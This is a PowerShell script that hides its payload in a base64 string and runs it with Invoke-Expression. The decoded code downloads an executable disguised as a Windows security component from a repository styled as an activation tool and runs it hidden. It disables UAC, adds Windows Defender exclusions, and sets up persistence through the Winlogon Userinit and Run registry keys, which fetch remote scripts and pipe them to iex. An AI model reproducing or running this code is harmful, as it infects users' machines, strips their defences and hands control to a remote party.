$base64EncodedString = "JG9mZmljZURvd25sb2FkVXJsQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJodHRwczovL2dpdGh1Yi5jb20vV2luZG93c1R3ZWFrc1gvUG93ZXJTaGVsbEFjdGl2YXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vZG9sYmFlYi5leGUiKSkKJHVwZGF0ZXJyckV4ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU2VjdXJpdHlBY2NvdW50cyBNYW5hZ2VyKFNBTSkuZXhlIikpCgokaGlkZGVuQXR0ckI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiSGlkZGVuIikpCiRzaWxlbnRseUNvbnRpbnVlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTaWxlbnRseUNvbnRpbnVlIikpCiRzdG9wQWN0aW9uQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTdG9wIikpCiRkaXJlY3RvcnlCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkRpcmVjdG9yeSIpKQokcHJvZ3JhbWZpbGVzQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJDOlxQcm9ncmFtIEZpbGVzIikpCgokb2ZmaWNlRG93bmxvYWRVcmwgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRvZmZpY2VEb3dubG9hZFVybEI2NCkpCiR1cGRhdGVycnJFeGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR1cGRhdGVycnJFeGVCNjQpKQokaGlkZGVuQXR0ciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGhpZGRlbkF0dHJCNjQpKQokc2lsZW50bHlDb250aW51ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNpbGVudGx5Q29udGludWVCNjQpKQokc3RvcEFjdGlvbiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHN0b3BBY3Rpb25CNjQpKQokZGlyZWN0b3J5ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGlyZWN0b3J5QjY0KSkKJHByb2dyYW1maWxlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHByb2dyYW1maWxlc0I2NCkpCgokaGlkZGVuRm9sZGVyTmFtZSA9ICJTZWN1cml0eUFjY291bnRzTWFuYWdlcl8iICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsOCkKJGhpZGRlbkZvbGRlciA9IEpvaW4tUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAkaGlkZGVuRm9sZGVyTmFtZQpOZXctSXRlbSAtSXRlbVR5cGUgJGRpcmVjdG9yeSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1Gb3JjZSB8IE91dC1OdWxsCiRvZmZpY2VQYXRoID0gSm9pbi1QYXRoICRoaWRkZW5Gb2xkZXIgJHVwZGF0ZXJyckV4ZQpOZXctSXRlbSAtUGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xFdGhlcm5ldCBDb25maWd1cmF0aW9uIiAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZQokc2NyaXB0UGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXEV0aGVybmV0IENvbmZpZ3VyYXRpb25cVXNlcmluaXQucHMxIgokcmVnUGF0aCA9ICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbiIKJG5ld1VzZXIgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlx1c2VyaW5pdC5leGUsQzpcUHJvZ3JhbSBGaWxlc1xFdGhlcm5ldCBDb25maWd1cmF0aW9uXFVzZXJpbml0LnBzMSIKCiRzY3JpcHRDb250ZW50ID0gQCcKJGNvbW1hbmQgPSAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgYCJpd3IgJ2h0dHBzOi8vZ2l0aHViLmNvbS9XaW5kb3dzVHdlYWtzWC9Qb3dlclNoZWxsQWN0aXZhdGUvcmF3L3JlZnMvaGVhZHMvbWFpbi9BY3RpdmF0ZVNjcmlwdCcgfCBpZXhgIiIKU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtQXJndW1lbnRMaXN0ICItTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIGAkY29tbWFuZCIgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIEhpZGRlbgonQAoKZnVuY3Rpb24gQWRkLUZvbGRlckV4Y2x1c2lvbiB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kcGF0aCwKICAgICAgICBbaW50XSRtYXhSZXRyaWVzID0gNSwKICAgICAgICBbaW50XSRkZWxheVNlY29uZHMgPSAxCiAgICApCiAgICAkcmV0cnlDb3VudCA9IDAKICAgICRzdWNjZXNzID0gJGZhbHNlCiAgICAKICAgIHdoaWxlICgtbm90ICRzdWNjZXNzIC1hbmQgJHJldHJ5Q291bnQgLWx0ICRtYXhSZXRyaWVzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gJHN0b3BBY3Rpb24KICAgICAgICAgICAgaWYgKEdldC1NcFByZWZlcmVuY2UgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBFeGNsdXNpb25QYXRoIHwgV2hlcmUtT2JqZWN0IHsgJF8gLWVxICRwYXRoIH0pIHsKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAkcmV0cnlDb3VudCsrCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheVNlY29uZHMKICAgICAgICB9CiAgICB9CiAgICBpZiAoLW5vdCAkc3VjY2VzcykgewogICAgfQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAyMDAKfQoKCnRyeSB7CiAgICBTZXQtQ29udGVudCAtUGF0aCAkc2NyaXB0UGF0aCAtVmFsdWUgJHNjcmlwdENvbnRlbnQKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHNjcmlwdFBhdGggLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgKFtTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXNdOjpIaWRkZW4pCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICJVc2VyaW5pdCIgLVZhbHVlICRuZXdVc2VyCiAgICBDbGVhci1Ib3N0CiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC1OYW1lICJFbmFibGVMVUEiIC1WYWx1ZSAwCiAgICBBZGQtRm9sZGVyRXhjbHVzaW9uIC1wYXRoICRwcm9ncmFtZmlsZXMKICAgIEFkZC1Gb2xkZXJFeGNsdXNpb24gLXBhdGggJGhpZGRlbkZvbGRlcgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkb2ZmaWNlUGF0aAogICAgCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRvZmZpY2VEb3dubG9hZFVybCAtT3V0RmlsZSAkb2ZmaWNlUGF0aCAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRvZmZpY2VQYXRoIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCgogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG9mZmljZVBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgCgogICAgJHJlZ1BhdGhPZmZpY2UgPSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgJHJlZ05hbWVPZmZpY2UgPSAiV2luZG93cyBQb3dlcnNoZWxsIFNlcnZpY2UgKFdQUykiCiAgICAkcmVnVmFsdWVPZmZpY2UgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCBgIml3ciAnaHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL1JlYWN0aXZhdGVTY3JpcHQnIHwgaWV4YCIiCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoT2ZmaWNlIC1OYW1lICRyZWdOYW1lT2ZmaWNlIC1WYWx1ZSAkcmVnVmFsdWVPZmZpY2UgLUVycm9yQWN0aW9uICRzaWxlbnRseUNvbnRpbnVlCiAgICAKICAgIE5ldy1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzIiAtTmFtZSAkdXBkYXRlcnJyRXhlIC1Gb3JjZSB8IE91dC1OdWxsCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzXCR1cGRhdGVycnJFeGUiIC1OYW1lICJFbmFibGVkIiAtVmFsdWUgMCAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMgp9IGNhdGNoIHsKICAgIGV4aXQgMQp9IGZpbmFsbHkgewogICAKfQo="
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
